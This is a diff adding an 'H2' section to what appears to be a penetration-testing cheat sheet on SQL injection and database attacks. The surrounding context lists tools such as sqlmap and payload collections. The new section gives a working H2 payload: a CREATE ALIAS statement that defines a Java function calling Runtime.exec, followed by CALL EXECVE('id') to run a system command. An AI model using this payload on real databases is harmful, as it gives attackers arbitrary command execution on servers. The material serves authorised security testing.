@@ -4,6 +4,7 @@
 
 ## Table of Contents
 
+- [H2](#h2)
 - [Hibernate Query Language Injection (HQLi)](#hibernate-query-language-injection-hqli)
 - [impacket-mssqlclient](#impacket-mssqlclient)
 - [MongoDB](#mongodb)
@@ -38,6 +39,18 @@
 | SQL Injection Payload List | SQL Injection Payload List | https://github.com/payloadbox/sql-injection-payload-list |
 | sqlmap | sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. | https://github.com/sqlmapproject/sqlmap |
 | sqlmap Websocket Proxy | Tool to enable blind sql injection attacks against websockets using sqlmap | https://github.com/BKreisel/sqlmap-websocket-proxy |
+
+## H2
+
+### Code Execution
+
+```c
+CREATE ALIAS EXECVE AS $$ String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : ""; }$$;
+```
+
+```c
+CALL EXECVE('id')
+```
 
 ## Hibernate Query Language Injection (HQLi)
 
